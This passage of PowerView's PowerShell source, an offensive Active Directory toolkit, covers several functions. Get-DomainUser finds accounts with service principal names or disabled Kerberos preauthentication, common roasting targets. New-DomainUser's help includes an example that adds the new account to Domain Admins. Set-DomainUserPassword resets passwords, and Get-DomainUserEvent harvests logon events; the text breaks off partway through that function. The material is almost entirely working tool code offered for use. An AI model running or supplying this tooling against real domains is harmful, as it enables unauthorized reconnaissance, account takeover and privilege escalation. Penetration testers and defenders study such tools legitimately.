        $UserReferencePropertySet = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        $GroupReferencePropertySet = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        $ComputerReferencePropertySet = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        # Domain / Credential
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $TargetForest = Get-Domain -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $TargetForest = Get-Domain -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'"
        }

        $SchemaArguments = @{}
        if ($PSBoundParameters['Credential']) { $SchemaArguments['Credential'] = $Credential }
        if ($TargetForest) {
            $SchemaArguments['Forest'] = $TargetForest
        }
    }

    PROCESS {

        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySet"
            $ReferenceObjectProperties = $ReferencePropertySet
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property set"
            $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
            $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass"
        }
        else {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'"
        }

        if (($ClassName -eq 'User') -or ($ReferenceObjectClass -eq 'User')) {
            $Objects = Get-DomainUser @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $UserReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Group') -or ($ReferenceObjectClass -eq 'Group')) {
            $Objects = Get-DomainGroup @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $GroupReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Computer') -or ($ReferenceObjectClass -eq 'Computer')) {
            $Objects = Get-DomainComputer @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $ComputerReferencePropertySet
            }
        }
        else {
            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName"
        }

        ForEach ($Object in $Objects) {
            $ObjectProperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($ObjectProperty in $ObjectProperties) {
                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $ObjectProperty
                    $Out | Add-Member Noteproperty 'Value' $Object.$ObjectProperty
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}


########################################################
#
# "net *" replacements and other fun start below
#
########################################################

function Get-DomainUser {
<#
.SYNOPSIS

Return all users or specific user objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all user objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted. Also accepts DOMAIN\user format.

.PARAMETER SPN

Switch. Only return user objects with non-null service principal names.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER AdminCount

Switch. Return users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER AllowDelegation

Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'

.PARAMETER DisallowDelegation

Switch. Return user accounts that are marked as 'sensitive and not allowed for delegation'

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER PreauthNotRequired

Switch. Return user accounts with "Do not require Kerberos preauthentication" set.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainUser -Domain testlab.local

Return all users for the testlab.local domain

.EXAMPLE

Get-DomainUser "S-1-5-21-890171859-3433809279-3366196753-1108","administrator"

Return the user with the given SID, as well as Administrator.

.EXAMPLE

'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff

lastlogoff                                   samaccountname
----------                                   --------------
12/31/1600 4:00:00 PM                        dfm.a
12/31/1600 4:00:00 PM                        dfm
12/31/1600 4:00:00 PM                        harmj0y
12/31/1600 4:00:00 PM                        Administrator

.EXAMPLE

Get-DomainUser -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -AdminCount -AllowDelegation

Search the specified OU for privileged user (AdminCount = 1) that allow delegation

.EXAMPLE

Get-DomainUser -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon

Search for users with a primary group ID other than 513 ('domain users') and only return samaccountname and lastlogon

.EXAMPLE

Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED

Find users who doesn't require Kerberos preauthentication and DON'T have an expired password.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

Get-DomainUser dev\user1 -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=user1)))

distinguishedname
-----------------
CN=user1,CN=Users,DC=dev,DC=testlab,DC=local

.INPUTS

String

.OUTPUTS

PowerView.User

Custom PSObject with translated user property fields.

PowerView.User.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # add in the negations
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $UserSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments['Domain'] = $UserDomain
                        Write-Verbose "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'
                # negation of "Accounts that are sensitive and not trusted for delegation"
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            # build the LDAP filter for the dynamic UAC filter value
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = Convert-LDAPProperty -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            $UserSearcher.dispose()
        }
    }
}


function New-DomainUser {
<#
.SYNOPSIS

Creates a new domain user (assuming appropriate permissions) and returns the user object.

TODO: implement all properties that New-ADUser implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to create a new
DirectoryServices.AccountManagement.UserPrincipal with the specified user properties.

.PARAMETER SamAccountName

Specifies the Security Account Manager (SAM) account name of the user to create.
Maximum of 256 characters. Mandatory.

.PARAMETER AccountPassword

Specifies the password for the created user. Mandatory.

.PARAMETER Name

Specifies the name of the user to create. If not provided, defaults to SamAccountName.

.PARAMETER DisplayName

Specifies the display name of the user to create. If not provided, defaults to SamAccountName.

.PARAMETER Description

Specifies the description of the user to create.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword

Creates the 'harmj0y2' user with the specified description and password.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$user = New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword -Credential $Cred

Creates the 'harmj0y2' user with the specified description and password, using the specified
alternate credentials.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred

Creates the 'andy' user with the specified description and password, using the specified
alternate credentials, and adds the user to 'domain admins' using Add-DomainGroupMember
and the alternate credentials.

.OUTPUTS

DirectoryServices.AccountManagement.UserPrincipal

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)

        # set all the appropriate user parameters
        $User.SamAccountName = $Context.Identity
        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        $User.SetPassword($TempCred.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False

        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $Context.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $DisplayName
        }
        else {
            $User.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters['Description']) {
            $User.Description = $Description
        }

        Write-Verbose "[New-DomainUser] Attempting to create user '$SamAccountName'"
        try {
            $Null = $User.Save()
            Write-Verbose "[New-DomainUser] User '$SamAccountName' successfully created"
            $User
        }
        catch {
            Write-Warning "[New-DomainUser] Error creating user '$SamAccountName' : $_"
        }
    }
}


function Set-DomainUserPassword {
<#
.SYNOPSIS

Sets the password for a given user identity.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified user -Identity,
which returns a DirectoryServices.AccountManagement.UserPrincipal object. The
SetPassword() function is then invoked on the user, setting the password to -AccountPassword.

.PARAMETER Identity

A user SamAccountName (e.g. User1), DistinguishedName (e.g. CN=user1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1113), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
specifying the user to reset the password for.

.PARAMETER AccountPassword

Specifies the password to reset the target user's to. Mandatory.

.PARAMETER Domain

Specifies the domain to use to search for the user identity, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword

Resets the password for 'andy' to the password specified.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred

Resets the password for 'andy' usering the alternate credentials specified.

.OUTPUTS

DirectoryServices.AccountManagement.UserPrincipal

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{ 'Identity' = $Identity }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)

        if ($User) {
            Write-Verbose "[Set-DomainUserPassword] Attempting to set the password for user '$Identity'"
            try {
                $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                $User.SetPassword($TempCred.GetNetworkCredential().Password)

                $Null = $User.Save()
                Write-Verbose "[Set-DomainUserPassword] Password for user '$Identity' successfully reset"
            }
            catch {
                Write-Warning "[Set-DomainUserPassword] Error setting password for user '$Identity' : $_"
            }
        }
        else {
            Write-Warning "[Set-DomainUserPassword] Unable to find user '$Identity'"
        }
    }
}


function Get-DomainUserEvent {
<#
.SYNOPSIS

Enumerate account logon events (ID 4624) and Logon with explicit credential
events (ID 4648) from the specified host (default of the localhost).

Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function uses an XML path filter passed to Get-WinEvent to retrieve
security events with IDs of 4624 (logon events) or 4648 (explicit credential
logon events) from -StartTime (default of now-1 day) to -EndTime (default of now).
A maximum of -MaxEvents (default of 5000) are returned.

.PARAMETER ComputerName

Specifies the computer name to retrieve events from, default of localhost.

.PARAMETER StartTime

The [DateTime] object representing the start of when to collect events.
Default of [DateTime]::Now.AddDays(-1).

.PARAMETER EndTime

The [DateTime] object representing the end of when to collect events.
Default of [DateTime]::Now.

.PARAMETER MaxEvents

The maximum number of events to retrieve. Default of 5000.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target computer.

.EXAMPLE

Get-DomainUserEvent

Return logon events on the local machine.

.EXAMPLE

Get-DomainController | Get-DomainUserEvent -StartTime ([DateTime]::Now.AddDays(-3))

Return all logon events from the last 3 days from every domain controller in the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUserEvent -ComputerName PRIMARY.testlab.local -Credential $Cred -MaxEvents 1000

Return a max of 1000 logon events from the specified machine using the specified alternate credentials.

.OUTPUTS

PowerView.LogonEvent

PowerView.ExplicitCredentialLogonEvent

.LINK

http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        # the XML filter we're passing to Get-WinEvent
        $XPathFilter = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $EventArguments = @{
            'FilterXPath' = $XPathFilter
            'LogName' = 'Security'
            'MaxEvents' = $MaxEvents
